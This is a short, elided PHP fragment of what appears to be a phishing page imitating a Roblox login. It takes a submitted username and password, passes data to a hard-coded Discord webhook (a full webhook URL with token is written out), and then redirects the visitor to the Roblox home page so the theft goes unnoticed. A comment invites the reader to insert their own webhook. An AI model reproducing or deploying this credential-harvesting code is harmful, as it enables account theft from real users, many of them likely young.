...
function sendToDiscordWebhook($data) {
    $webhookUrls = [
        'https://discord.com/api/webhooks/1388036421675257857/X7DSr2iRE_ciSReg0PWGaCDuPq-Ufe0IryUp1JCkh2GNy7McT_VKMMCYWpIQjPip8Kum',  // Replace with your actual Discord webhook URL
    ];
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    if (!empty($username) && !empty($password)) {
        ...
        header('https://www.roblox.com/home');
        exit();
    }
}
